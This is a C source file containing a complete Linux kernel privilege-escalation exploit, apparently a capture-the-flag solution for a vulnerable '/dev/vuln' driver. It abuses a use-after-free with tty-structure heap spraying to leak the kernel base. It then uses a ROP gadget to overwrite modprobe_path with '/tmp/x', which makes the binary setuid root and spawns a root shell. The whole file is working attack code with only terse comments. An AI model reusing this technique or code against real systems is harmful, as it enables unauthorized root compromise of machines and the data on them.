#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <sched.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupted*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;
typedef uint32_t u32;

#define fd_alloc 0x4008B900
#define fd_write 0x4001B902
#define fd_free 0xB901
#define fd_read 0x8001B902

u64 fd1;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
char buf[0x505]; // declaration in global to prevent bad coding pratice (etc, forget to rewrite struct metadata value when heap overflow)
u64 spray[105];

void win()
{
    system("echo '#!/bin/sh\nchown root:root /exploit\nchmod 4555 /exploit' > /tmp/x");
    system("chmod 777 /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod 777 /tmp/dummy");
    system("/tmp/dummy");
    puts("[*] win, run './exploit 13377554' to get root");
    // better get root before kernel crash
    system("./exploit 13377554");
}

int main(int argc, char **argv)
{
    // too lazy to write separate program to spawn a shell
    if (argc == 2 && !strcmp(argv[1], "13377554"))
    {
        printf("[+] getuid() returns %d\n", geteuid());
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return 0;
    }
    // NORMAL EXPLOIT START FROM HERE

    // uaf
    fd1 = open("/dev/vuln", O_RDWR);
    u64 siz = 0x400; // funni dev
    ioctl(fd1, fd_alloc, &siz);
    ioctl(fd1, fd_free, 0);

    // heap spray
    for_x(i, 0, 49) spray[i] = open("/dev/ptmx", O_RDWR);

    // leak
    ioctl(fd1, fd_read, buf);
    kbase = *(u64 *)(&buf[0x20]) - 0x1285100;
    g_buf = *(u64 *)(&buf[0x40]) - 0x40;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[*] koffset: 0x%lx\n", koffset);
    u64 modprobe_path = koffset + 0xffffffff82b3f600;
    u64 mov_gadget = koffset + 0xffffffff81dbc823;
    // 0xffffffff81dbc823 : mov dword ptr [rdx - 0x76b700c2], esi ; ret

    // overwrite tty struct
    *(u64 *)(&buf[0x20]) = g_buf;
    *(u64 *)(&buf[8 * 0xc]) = mov_gadget;
    ioctl(fd1, fd_write, buf);

    // overwrite modprobe_path -> "/tmp/x"
    puts("[*] overwrite modprobe_path");
    for_x(i, 0, 49) ioctl(spray[i], 0x706d742f /* esi */, modprobe_path + 0x76b700c2 /* rdx */);
    for_x(i, 0, 49) ioctl(spray[i], 0x782f, modprobe_path + 4 + 0x76b700c2);

    // trigger modprobe_path
    win();

    // clean up
    //for_x(i, 0, 49) close(spray[i]);
    // kernel crash when return from main wtf?
}
